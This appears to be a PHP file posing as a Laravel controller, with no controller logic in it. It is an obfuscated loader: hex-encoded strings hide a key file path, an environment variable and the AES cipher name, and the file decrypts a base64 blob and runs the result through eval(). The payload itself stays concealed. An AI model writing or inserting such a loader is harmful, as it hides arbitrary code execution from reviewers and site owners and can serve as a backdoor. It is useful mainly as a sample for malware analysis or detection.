<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('ZRTUscFQJwPPTdW6vhuJyg==');

$c=base64_decode(

'pQgiZljzTCLox92a60wps8j+GfQr9HfFEYc+Nbe53lxgkhzUNY2dr2oRVtU3oxZ3R4SzEmFEyodQ' .
'lrxiRflZR/VhpueSVhglj6gUlCj6sBha9f358TnPTMcgNl4h6hyik/9YLx7v94q3anSv0lsRrzeK' .
'7jFGVhsVqF3yVedziCuoJbEi6+8ryrteDGDqQs8Muc6rOf6xyA1CpVFxIKVRqP5wG5ithN+Eyatg' .
'zi/qMaA5VrJqjqudWvbumoa4yu1G7aVesnYi34iygvitwiYDNQ=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

